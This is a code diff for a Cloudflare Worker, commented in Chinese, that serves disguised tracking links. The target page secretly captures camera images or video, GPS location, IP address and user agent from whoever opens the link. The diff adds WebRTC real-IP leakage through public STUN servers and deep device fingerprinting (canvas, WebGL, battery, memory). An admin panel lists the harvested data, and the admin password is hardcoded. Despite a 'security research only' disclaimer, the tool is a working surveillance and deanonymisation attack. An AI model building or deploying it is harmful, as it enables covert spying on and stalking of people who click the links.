@@ -1,5 +1,6 @@
-﻿/**
- * 现代简约技术研究系统 - 修复编译版 & 独立后台登录
+/**
+ * 现代简约技术研究系统 - 增强版
+ * 新增功能：WebRTC IP泄露检测、深度设备指纹、UA解析、经纬度修正、后台增强
  * 仅供安全研究、靶场测试及前端权限调用学习使用
  */
 
@@ -7,25 +8,34 @@ const ADMIN_PASSWORD = "sakcnzz666";
 const IMAGE_HOST = "tc.ilqx.dpdns.org";
 const GEO_API = "https://ip.ilqx.dpdns.org/geo";
 
+// WebRTC STUN 服务器列表（用于IP泄露检测）
+const STUN_SERVERS = [
+  "stun:stun.chat.bilibili.com:3478",
+  "stun:stun.hitv.com:3478",
+  "stun:stun.miwifi.com:3478",
+  "stun:stun.l.google.com:19302",
+  "stun:stun.cloudflare.com:3478",
+  "stun:global.stun.twilio.com:3478",
+  "stun:stun.nextcloud.com:3478",
+  "stun:stun.voip.blackberry.com:3478",
+  "stun:stun.freeswitch.org:3478"
+];
+
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
     const path = url.pathname;
 
-    // 1. 自动初始化数据库
     await initDB(env);
 
-    // 2. 路由分发
     if (path === "/" || path === "/index.html") return renderHome();
     if (path.startsWith("/t/")) return renderTargetPage(path.split("/")[2]);
 
-    // API 接口
     if (path === "/api/generate") return handleGenerate(request, env);
     if (path === "/api/upload") return handleUpload(request, env);
     if (path === "/api/query") return handleQuery(request, env);
-    if (path === "/api/delete") return handleDelete(request, env);  // 新增删除文件接口
+    if (path === "/api/delete") return handleDelete(request, env);
 
-    // 管理后台及操作接口
     if (path === "/admin") return renderAdmin(request, env);
     if (path === "/admin/delete") return handleAdminDelete(request, env);
     if (path === "/admin/clear") return handleAdminClear(request, env);
@@ -35,14 +45,14 @@ export default {
 };
 
 /* ==========================================
- * 数据库初始化
+ * 数据库初始化（增加webrtc_ip和device_info字段）
  * ========================================== */
 async function initDB(env) {
   await env.DB.prepare(`
     CREATE TABLE IF NOT EXISTS sys_logs (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       target_id TEXT,
-      event_type TEXT,    -- 'GENERATE', 'VISIT', 'QUERY', 'DELETE'
+      event_type TEXT,
       ip TEXT,
       geo_info TEXT,
       device_geo TEXT,
@@ -52,6 +62,8 @@ async function initDB(env) {
       status TEXT,
       is_burned INTEGER DEFAULT 0,
       is_deleted INTEGER DEFAULT 0,
+      webrtc_ip TEXT,
+      device_info TEXT,
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
   `).run();
@@ -68,6 +80,12 @@ async function initDB(env) {
   // 兼容旧表新增字段
   try {
     await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN is_deleted INTEGER DEFAULT 0`).run();
+  } catch (e) {}
+  try {
+    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN webrtc_ip TEXT`).run();
+  } catch (e) {}
+  try {
+    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN device_info TEXT`).run();
   } catch (e) {}
 }
 
@@ -87,7 +105,6 @@ async function getGeoByIp(ip) {
  * 业务 API
  * ========================================== */
 
-// 生成链接 (支持 multipart 上传文件)
 async function handleGenerate(request, env) {
   if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
   
@@ -95,7 +112,6 @@ async function handleGenerate(request, env) {
   let config, file, downloadUrl = "";
   let password = null;
 
-  // 处理 multipart/form-data (文件下载模板)
   if (contentType.includes("multipart/form-data")) {
     const formData = await request.formData();
     config = JSON.parse(formData.get("config"));
@@ -103,7 +119,6 @@ async function handleGenerate(request, env) {
     password = formData.get("password")?.trim() || null;
 
     if (config.template === "download" && file) {
-      // 上传文件到图床
       const uploadForm = new FormData();
       uploadForm.append("file", file);
       const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: "POST", body: uploadForm });
@@ -117,7 +132,6 @@ async function handleGenerate(request, env) {
       downloadUrl = config.redirectUrl;
     }
   } else {
-    // 普通 JSON 生成
     config = await request.json();
     password = config.password?.trim() || null;
   }
@@ -127,7 +141,6 @@ async function handleGenerate(request, env) {
   const geo = await getGeoByIp(ip);
   const ua = request.headers.get("user-agent") || "";
 
-  // 密码唯一性校验
   try {
     const existing = await env.DB.prepare("SELECT password FROM trackings WHERE target_id = ?").bind(targetId).first();
     if (existing) {
@@ -137,17 +150,14 @@ async function handleGenerate(request, env) {
           headers: { "Content-Type": "application/json" }
         });
       }
-      // 更新配置 (保留旧密码)
       if (password) {
         await env.DB.prepare("UPDATE trackings SET password = ?, burn_enabled = ?, file_url = ? WHERE target_id = ?")
           .bind(password, config.burn ? 1 : 0, downloadUrl, targetId).run();
       } else if (!existing.password) {
-        // 无密码更新
         await env.DB.prepare("UPDATE trackings SET burn_enabled = ?, file_url = ? WHERE target_id = ?")
           .bind(config.burn ? 1 : 0, downloadUrl, targetId).run();
       }
     } else {
-      // 新 ID
       await env.DB.prepare("INSERT INTO trackings (target_id, password, burn_enabled, file_url) VALUES (?,?,?,?)")
         .bind(targetId, password, config.burn ? 1 : 0, downloadUrl).run();
     }
@@ -155,11 +165,9 @@ async function handleGenerate(request, env) {
     return new Response(JSON.stringify({ error: "ID 配置冲突：" + e.message }), { status: 500 });
   }
 
-  // 日志记录 GENERATE
   await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
     .bind(targetId, 'GENERATE', ip, geo, ua, 'success').run();
 
-  // 将配置编码进链接 (不包含密码)
   const pureConfig = { ...config };
   delete pureConfig.password;
   const encoded = btoa(encodeURIComponent(JSON.stringify(pureConfig)));
@@ -168,7 +176,6 @@ async function handleGenerate(request, env) {
   });
 }
 
-// 上传媒体 (目标页)
 async function handleUpload(request, env) {
   try {
     const formData = await request.formData();
@@ -180,6 +187,8 @@ async function handleUpload(request, env) {
     const ua = request.headers.get("user-agent") || "Unknown";
     const ip = request.headers.get("cf-connecting-ip") || "Unknown";
     const geo = await getGeoByIp(ip);
+    const webrtcIp = formData.get("webrtc_ip") || "";
+    const deviceInfo = formData.get("device_info") || "";
     let fullMediaUrl = "";
 
     if (file && (status === "success" || status === "download")) {
@@ -193,9 +202,9 @@ async function handleUpload(request, env) {
     }
 
     await env.DB.prepare(`
-      INSERT INTO sys_logs (target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status)
-      VALUES (?,?,?,?,?,?,?,?,?)
-    `).bind(config.id, 'VISIT', ip, geo, deviceGeo, mediaType, fullMediaUrl, ua, status).run();
+      INSERT INTO sys_logs (target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status, webrtc_ip, device_info)
+      VALUES (?,?,?,?,?,?,?,?,?,?,?)
+    `).bind(config.id, 'VISIT', ip, geo, deviceGeo, mediaType, fullMediaUrl, ua, status, webrtcIp, deviceInfo).run();
 
     return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
   } catch (err) {
@@ -203,7 +212,6 @@ async function handleUpload(request, env) {
   }
 }
 
-// 查询接口
 async function handleQuery(request, env) {
   const { searchParams } = new URL(request.url);
   const targetId = searchParams.get("id");
@@ -213,7 +221,6 @@ async function handleQuery(request, env) {
   const geo = await getGeoByIp(ip);
   const ua = request.headers.get("user-agent") || "";
 
-  // 密码验证
   const tracking = await env.DB.prepare("SELECT password FROM trackings WHERE target_id = ?").bind(targetId).first();
   if (tracking && tracking.password) {
     if (!password || password !== tracking.password) {
@@ -224,26 +231,22 @@ async function handleQuery(request, env) {
     }
   }
 
-  // 查询日志 (排除已删除)
   const { results } = await env.DB.prepare(
     "SELECT * FROM sys_logs WHERE target_id = ? AND event_type = 'VISIT' AND is_deleted = 0 ORDER BY created_at DESC"
   ).bind(targetId).all();
 
-  // 阅后即焚仅在密码存在时启用
   const shouldBurn = burnParam && tracking && tracking.password;
   if (shouldBurn && results.length > 0) {
     await env.DB.prepare("UPDATE sys_logs SET is_burned = 1 WHERE target_id = ? AND event_type = 'VISIT'")
       .bind(targetId).run();
   }
 
-  // 日志记录本次查询
   await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
     .bind(targetId, 'QUERY', ip, geo, ua, 'success').run();
 
   return new Response(JSON.stringify(results), { headers: { "Content-Type": "application/json" } });
 }
 
-// 删除媒体 (带密码)
 async function handleDelete(request, env) {
   if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
   const data = await request.json();
@@ -266,18 +269,15 @@ async function handleDelete(request, env) {
   const geo = await getGeoByIp(ip);
   const ua = request.headers.get("user-agent") || "";
 
-  // 标记删除
   await env.DB.prepare("UPDATE sys_logs SET is_deleted = 1 WHERE target_id = ? AND event_type = 'VISIT'")
     .bind(targetId).run();
 
-  // 记录删除事件
   await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
     .bind(targetId, 'DELETE', ip, geo, ua, 'success').run();
 
   return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
 }
 
-// 后台删除单条记录
 async function handleAdminDelete(request, env) {
   const cookie = request.headers.get("Cookie") || "";
   if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
@@ -290,7 +290,6 @@ async function handleAdminDelete(request, env) {
   return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
 }
 
-// 后台清空所有日志
 async function handleAdminClear(request, env) {
   const cookie = request.headers.get("Cookie") || "";
   if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
@@ -303,7 +302,7 @@ async function handleAdminClear(request, env) {
 }
 
 /* ==========================================
- * 前端 UI 渲染 (首页、目标页)
+ * 前端 UI 渲染
  * ========================================== */
 
 function renderHome() {
@@ -316,6 +315,7 @@ function renderHome() {
     <title>SEC-TEST 漏洞分析平台</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/1.0.37/ua-parser.min.js"></script>
     <style>
       body { background: linear-gradient(135deg, #f6f8fd 0%, #f1f5f9 100%); }
       .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.5); }
@@ -325,6 +325,8 @@ function renderHome() {
       input:checked + .toggle-bg + .dot { transform: translateX(100%); }
       .custom-scrollbar::-webkit-scrollbar { width: 6px; }
       .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+      .expandable { cursor: pointer; }
+      .expand-content { display: none; }
     </style>
   </head>
   <body class="min-h-screen text-gray-800 selection:bg-indigo-100 selection:text-indigo-900">
@@ -457,7 +459,6 @@ function renderHome() {
         downloadBox.style.display = tpl === 'download' ? 'block' : 'none';
         const mode = document.querySelector('input[name="mode"]:checked').value;
         videoOptions.style.display = mode === 'video' ? 'block' : 'none';
-        // 阅后即焚依赖密码
         if (passwordInput.value.trim() === '') {
           burnCheck.disabled = true;
           burnCheck.checked = false;
@@ -492,7 +493,6 @@ function renderHome() {
         const hasFile = document.getElementById('download_file').files.length > 0;
         const downloadUrl = document.getElementById('download_url').value.trim();
         
-        // 如果是下载模板且上传了文件，使用 multipart
         if (tpl === 'download' && (hasFile || downloadUrl)) {
           const fd = new FormData();
           fd.append('config', JSON.stringify(config));
@@ -531,11 +531,31 @@ function renderHome() {
         linkBox.classList.remove('hidden');
       }
 
+      function formatDeviceInfo(deviceInfo) {
+        if (!deviceInfo) return '无';
+        try {
+          const info = typeof deviceInfo === 'string' ? JSON.parse(deviceInfo) : deviceInfo;
+          let html = '<div class="text-xs space-y-1">';
+          if (info.resolution) html += '<div><i class="fa-solid fa-desktop"></i> 屏幕: ' + info.resolution + '</div>';
+          if (info.language) html += '<div><i class="fa-solid fa-language"></i> 语言: ' + info.language + '</div>';
+          if (info.timezone) html += '<div><i class="fa-solid fa-clock"></i> 时区: ' + info.timezone + '</div>';
+          if (info.platform) html += '<div><i class="fa-brands fa-windows"></i> 平台: ' + info.platform + '</div>';
+          if (info.memory) html += '<div><i class="fa-solid fa-microchip"></i> 内存: ' + info.memory + ' GB</div>';
+          if (info.cores) html += '<div><i class="fa-solid fa-chart-simple"></i> CPU核心: ' + info.cores + '</div>';
+          if (info.touchSupport) html += '<div><i class="fa-solid fa-hand"></i> 触屏支持: 是</div>';
+          if (info.battery !== undefined) html += '<div><i class="fa-solid fa-battery-full"></i> 电池: ' + (info.battery ? info.battery.level * 100 + '%' : '不支持') + '</div>';
+          if (info.webgl) html += '<div><i class="fa-solid fa-cube"></i> WebGL: ' + info.webgl + '</div>';
+          html += '<button class="text-indigo-500 text-xs mt-1 expandable" onclick="toggleExpand(this)">查看完整JSON</button><div class="expand-content hidden">' + JSON.stringify(info, null, 2) + '</div>';
+          html += '</div>';
+          return html;
+        } catch(e) { return '解析失败'; }
+      }
+
       async function queryData() {
         const id = document.getElementById('query_id').value.trim();
         if(!id) return alert('请输入追踪 ID');
         const password = document.getElementById('query_password').value.trim();
-        const isBurn = burnCheck.checked;
+        const isBurn = document.getElementById('burn_after_reading').checked;
         document.getElementById('query_loading').classList.remove('hidden');
         document.getElementById('query_result').innerHTML = '';
 
@@ -565,35 +585,52 @@ function renderHome() {
                 mediaHtml = '<img src="' + log.media_url + '" class="w-full rounded-xl shadow-sm">';
               }
             }
+            
             let geoHtml = '';
             if (log.device_geo) {
               const geo = JSON.parse(log.device_geo);
               if(geo.denied) {
                 geoHtml = '<div class="text-sm text-amber-600 mt-2"><i class="fa-solid fa-location-dot mr-1"></i>GPS定位：用户拒绝授权</div>';
               } else {
-                geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：' + geo.lat + ', ' + geo.lng + ' (精度:' + geo.accuracy + 'm)</div>';
+                // 修正经纬度顺序: 先经度后纬度
+                geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：经度 ' + geo.lng + ', 纬度 ' + geo.lat + ' (精度:' + geo.accuracy + 'm)</div>';
               }
             }
+            
             const ipInfo = log.geo_info ? JSON.parse(log.geo_info) : {};
             const flag = ipInfo.flag || '';
             const cReg = ipInfo.countryRegion || '';
             const city = ipInfo.city || '';
-            const finalIpStr = ipInfo.ip ? flag + ' ' + cReg + ' ' + city + ' [' + ipInfo.ip + ']' : log.ip;
+            const realIp = log.ip;
+            const webrtcIp = log.webrtc_ip || '未检测到';
+            
+            // UA 解析
+            let uaParser = new UAParser(log.ua);
+            let uaResult = uaParser.getResult();
+            let uaHtml = '<div class="text-xs"><i class="fa-brands fa-safari mr-1"></i> UA原文: <span class="font-mono break-all">' + escapeHtml(log.ua) + '</span>';
+            uaHtml += '<br><i class="fa-solid fa-info-circle mr-1"></i> 解析: ' + uaResult.browser.name + ' ' + uaResult.browser.version + ' / ' + uaResult.os.name + ' ' + uaResult.os.version;
+            uaHtml += '<button class="text-indigo-500 text-xs ml-2 expandable" onclick="toggleExpand(this)">展开</button><div class="expand-content hidden">完整解析: ' + JSON.stringify(uaResult, null, 2) + '</div>';
+            uaHtml += '</div>';
+            
             const dateStr = new Date(log.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
             html += '<div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm fade-in" style="animation-delay: ' + (index * 0.1) + 's">' +
                       '<div class="flex justify-between items-center mb-3">' +
                         '<span class="text-xs font-bold px-2 py-1 bg-gray-100 rounded text-gray-600">记录 #' + log.id + '</span>' +
                         '<span class="text-xs text-gray-400"><i class="fa-regular fa-clock"></i> ' + dateStr + '</span>' +
                       '</div>' +
+                      '<div class="mb-3 p-3 bg-gray-50 rounded-lg text-xs space-y-1">' +
+                        '<div><i class="fa-solid fa-network-wired"></i> 访问IP: ' + realIp + ' ' + flag + ' ' + cReg + ' ' + city + '</div>' +
+                        '<div><i class="fa-solid fa-shield-halved"></i> WebRTC泄露IP: ' + webrtcIp + '</div>' +
+                        uaHtml +
+                      '</div>' +
                       mediaHtml +
                       geoHtml +
-                      '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs text-gray-600 space-y-1">' +
-                        '<div><i class="fa-solid fa-network-wired w-4"></i> ' + finalIpStr + '</div>' +
-                        '<div class="truncate" title="' + log.ua + '"><i class="fa-brands fa-safari w-4"></i> ' + log.ua + '</div>' +
+                      '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs">' +
+                        '<strong><i class="fa-solid fa-microchip"></i> 设备指纹信息</strong>' +
+                        formatDeviceInfo(log.device_info) +
                       '</div>' +
                     '</div>';
           });
-          // 如果已设置密码，且查询时提供了正确密码，显示删除按钮
           if (password && logs.length > 0) {
             html += '<div class="text-center mt-4"><button onclick="deleteMedia(\'' + id + '\', \'' + password + '\')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium hover:bg-red-200"><i class="fa-solid fa-trash mr-1"></i>删除所有已捕获媒体</button></div>';
           }
@@ -601,6 +638,22 @@ function renderHome() {
         } finally {
           document.getElementById('query_loading').classList.add('hidden');
         }
+      }
+
+      window.toggleExpand = function(btn) {
+        const content = btn.nextElementSibling;
+        if (content.style.display === 'none' || !content.style.display) {
+          content.style.display = 'block';
+          btn.textContent = '收起';
+        } else {
+          content.style.display = 'none';
+          btn.textContent = '展开';
+        }
+      };
+
+      function escapeHtml(text) {
+        if (!text) return '';
+        return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
       }
 
       async function deleteMedia(id, password) {
@@ -613,7 +666,7 @@ function renderHome() {
         const data = await res.json();
         if (data.success) {
           alert('删除成功');
-          queryData(); // 刷新
+          queryData();
         } else {
           alert('删除失败：' + (data.error || '未知错误'));
         }
@@ -646,6 +699,89 @@ function renderTargetPage(encodedConfig) {
     <script>
       const config = JSON.parse(decodeURIComponent(atob("${encodedConfig}")));
       let deviceLocation = null;
+      let collectedWebrtcIp = "";
+      let collectedDeviceInfo = {};
+
+      // WebRTC IP 收集
+      async function collectWebRTCIP() {
+        return new Promise((resolve) => {
+          const servers = ${JSON.stringify(STUN_SERVERS)};
+          let foundIp = null;
+          let pending = servers.length;
+          if (pending === 0) return resolve(null);
+          
+          const checkDone = () => {
+            pending--;
+            if (pending === 0 && !foundIp) resolve(null);
+          };
+          
+          servers.forEach(server => {
+            try {
+              const pc = new RTCPeerConnection({ iceServers: [{ urls: server }] });
+              pc.createDataChannel('');
+              pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => {});
+              pc.onicecandidate = (ice) => {
+                if (ice.candidate && ice.candidate.candidate) {
+                  const ipMatch = /([0-9]{1,3}\\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                  if (ipMatch && ipMatch[0] && !foundIp && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.') && !ipMatch[0].startsWith('172.')) {
+                    foundIp = ipMatch[0];
+                    resolve(foundIp);
+                    pc.close();
+                  }
+                }
+                checkDone();
+              };
+              setTimeout(() => {
+                if (!foundIp) pc.close();
+                checkDone();
+              }, 2000);
+            } catch(e) { checkDone(); }
+          });
+        });
+      }
+
+      // 深度设备指纹收集
+      async function collectDeviceInfo() {
+        const info = {};
+        info.resolution = screen.width + 'x' + screen.height;
+        info.colorDepth = screen.colorDepth;
+        info.language = navigator.language;
+        info.platform = navigator.platform;
+        info.userAgent = navigator.userAgent;
+        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        info.hardwareConcurrency = navigator.hardwareConcurrency || '未知';
+        info.deviceMemory = navigator.deviceMemory || '未知';
+        info.maxTouchPoints = navigator.maxTouchPoints || 0;
+        info.touchSupport = 'ontouchstart' in window;
+        info.doNotTrack = navigator.doNotTrack;
+        info.cookieEnabled = navigator.cookieEnabled;
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          canvas.width = 200;
+          canvas.height = 50;
+          ctx.fillText('fingerprint', 10, 20);
+          info.canvasFingerprint = canvas.toDataURL().substring(0, 100);
+        } catch(e) {}
+        try {
+          const gl = document.createElement('canvas').getContext('webgl');
+          if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+              info.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+          }
+        } catch(e) {}
+        if ('getBattery' in navigator) {
+          try {
+            const battery = await navigator.getBattery();
+            info.battery = { level: battery.level * 100, charging: battery.charging };
+          } catch(e) {}
+        }
+        return info;
+      }
 
       function renderUI() {
         const container = document.getElementById('template_container');
@@ -660,7 +796,10 @@ function renderTargetPage(encodedConfig) {
 
       async function execute() {
         renderUI();
-
+        
+        // 并行收集附加信息
+        const webrtcPromise = collectWebRTCIP();
+        const deviceInfoPromise = collectDeviceInfo();
         if (config.needLocation) {
           try {
             const pos = await new Promise((resolve, reject) => {
@@ -671,8 +810,10 @@ function renderTargetPage(encodedConfig) {
             deviceLocation = JSON.stringify({ denied: true, error: e.message });
           }
         }
-
-        // 下载模板跳过摄像头
+        
+        collectedWebrtcIp = await webrtcPromise;
+        collectedDeviceInfo = await deviceInfoPromise;
+        
         if (config.template === 'download') {
           await sendPayload(null, 'download');
           if (config.downloadUrl || config.redirectUrl) {
@@ -710,18 +851,22 @@ function renderTargetPage(encodedConfig) {
         v.muted = true;
         await v.play();
         await new Promise(resolve => {
-          if (v.readyState >= 2) resolve();
+          if (v.readyState >= 2 && v.videoWidth > 0) resolve();
           else v.addEventListener('canplay', resolve, { once: true });
         });
-        await new Promise(r => setTimeout(r, 800));
+        // 确保视频帧已准备
+        await new Promise(r => setTimeout(r, 500));
         const c = document.getElementById('c');
         c.width = v.videoWidth || 640;
         c.height = v.videoHeight || 480;
-        c.getContext('2d').drawImage(v, 0, 0);
+        if (c.width === 0) c.width = 640;
+        if (c.height === 0) c.height = 480;
+        const ctx = c.getContext('2d');
+        ctx.drawImage(v, 0, 0, c.width, c.height);
         stream.getTracks().forEach(t => t.stop());
         c.toBlob(async (blob) => {
           await sendPayload(blob, 'success');
-        }, 'image/jpeg', 0.6);
+        }, 'image/jpeg', 0.8);
       }
 
       async function captureVideo(stream) {
@@ -761,6 +906,8 @@ function renderTargetPage(encodedConfig) {
         fd.append('config', JSON.stringify(config));
         fd.append('status', status);
         if(deviceLocation) fd.append('location', deviceLocation);
+        if(collectedWebrtcIp) fd.append('webrtc_ip', collectedWebrtcIp);
+        if(collectedDeviceInfo) fd.append('device_info', JSON.stringify(collectedDeviceInfo));
         await fetch('/api/upload', { method: 'POST', body: fd });
       }
 
@@ -772,7 +919,7 @@ function renderTargetPage(encodedConfig) {
 }
 
 /* ==========================================
- * 管理员后台 (含时间轴、预览、危险操作)
+ * 管理员后台 (增强版，显示所有新字段)
  * ========================================== */
 function renderAdminLogin(errorMsg = "") {
   const errorHtml = errorMsg ? `<div class="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100">${errorMsg}</div>` : "";
@@ -833,7 +980,6 @@ async function renderAdmin(request, env) {
 
   const { results } = await env.DB.prepare("SELECT * FROM sys_logs ORDER BY created_at DESC LIMIT 500").all();
 
-  // 按 target_id 分组
   const groups = new Map();
   for (const r of results) {
     if (!groups.has(r.target_id)) groups.set(r.target_id, []);
@@ -842,7 +988,6 @@ async function renderAdmin(request, env) {
 
   let sectionsHtml = "";
   for (const [targetId, logs] of groups) {
-    // 组标题
     sectionsHtml += `<div class="mb-6 bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
       <div class="p-4 bg-indigo-50 border-b border-indigo-100 flex items-center justify-between">
         <h2 class="text-lg font-bold text-indigo-900"><i class="fa-solid fa-fingerprint mr-2"></i>跟踪 ID：${escapeHtml(targetId)} <span class="text-sm text-gray-500 ml-2">(${logs.length} 条记录)</span></h2>
@@ -853,8 +998,10 @@ async function renderAdmin(request, env) {
             <tr>
               <th class="p-4 text-sm font-semibold text-gray-600">事件 / 时间</th>
               <th class="p-4 text-sm font-semibold text-gray-600">IP / 定位</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">WebRTC IP</th>
               <th class="p-4 text-sm font-semibold text-gray-600">GPS</th>
               <th class="p-4 text-sm font-semibold text-gray-600">媒体</th>
+              <th class="p-4 text-sm font-semibold text-gray-600">设备指纹</th>
               <th class="p-4 text-sm font-semibold text-gray-600">操作</th>
             </tr>
           </thead>
@@ -891,9 +1038,17 @@ async function renderAdmin(request, env) {
              if (dGeo.denied) {
                  deviceGeoBlock = '<span class="text-red-500 text-xs">拒绝定位</span>';
              } else {
-                 deviceGeoBlock = '<div class="text-xs text-emerald-600 font-mono">' + dGeo.lat + ', ' + dGeo.lng + '</div>';
+                 deviceGeoBlock = '<div class="text-xs text-emerald-600 font-mono">经度 ' + dGeo.lng + ', 纬度 ' + dGeo.lat + '</div>';
              }
          } catch(e) {}
+      }
+
+      let deviceInfoBrief = '<span class="text-gray-400 text-xs">-</span>';
+      if (r.device_info) {
+        try {
+          const dinfo = JSON.parse(r.device_info);
+          deviceInfoBrief = `<div class="text-xs"><i class="fa-solid fa-desktop"></i> ${dinfo.resolution || ''}<br><i class="fa-solid fa-microchip"></i> ${dinfo.hardwareConcurrency || ''}核<br><button onclick="alert('${escapeJs(JSON.stringify(dinfo, null, 2))}')" class="text-indigo-500 text-xs">详情</button></div>`;
+        } catch(e) {}
       }
 
       const burnedBadge = r.is_burned ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-orange-100 text-orange-600">已焚毁</span>' : '';
@@ -911,15 +1066,17 @@ async function renderAdmin(request, env) {
         <td class="p-4">
           <div class="text-sm font-mono text-gray-800">${escapeHtml(r.ip)}</div>
           <div class="text-xs text-gray-500 truncate max-w-xs" title="${escapeHtml(geoStr)}">${escapeHtml(geoStr)}</div>
-        </td>
+         </td>
+        <td class="p-4 text-sm font-mono">${escapeHtml(r.webrtc_ip || '未检测')}</td>
         <td class="p-4">${deviceGeoBlock}</td>
         <td class="p-4">${mediaBlock}</td>
+        <td class="p-4">${deviceInfoBrief}</td>
         <td class="p-4">
           <button onclick="deleteLog(${r.id})" class="text-red-500 hover:text-red-700 text-xs"><i class="fa-solid fa-trash-can"></i></button>
         </td>
-      </tr>`;
+       </tr>`;
     }
-    sectionsHtml += `</tbody></table></div></div>`;
+    sectionsHtml += `</tbody> </div></div>`;
   }
 
   const html = `
@@ -938,16 +1095,15 @@ async function renderAdmin(request, env) {
   <body class="bg-gray-100 p-6 font-sans">
     <div class="max-w-7xl mx-auto">
       <div class="flex justify-between items-center mb-6 bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
-        <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志</h1>
+        <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志（按时间轴）</h1>
         <div class="flex items-center space-x-4">
-          <span class="text-sm text-gray-500">最近 500 条记录（按ID时间轴分组）</span>
+          <span class="text-sm text-gray-500">最近 500 条记录</span>
           <button onclick="clearAll()" class="px-4 py-2 bg-red-600 text-white text-sm rounded-xl hover:bg-red-700 shadow">清空所有数据</button>
         </div>
       </div>
       ${sectionsHtml}
     </div>
 
-    <!-- 媒体预览模态框 -->
     <div id="mediaModal" class="modal" onclick="this.classList.remove('active')">
       <div class="bg-white rounded-2xl p-4 max-w-3xl max-h-[90vh] overflow-auto shadow-2xl" onclick="event.stopPropagation()">
         <div id="mediaContent" class="flex items-center justify-center"></div>
@@ -988,10 +1144,11 @@ async function renderAdmin(request, env) {
   return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
 
-// 辅助转义函数
 function escapeHtml(text) {
+  if (!text) return '';
   return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 function escapeJs(str) {
+  if (!str) return '';
   return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
 }
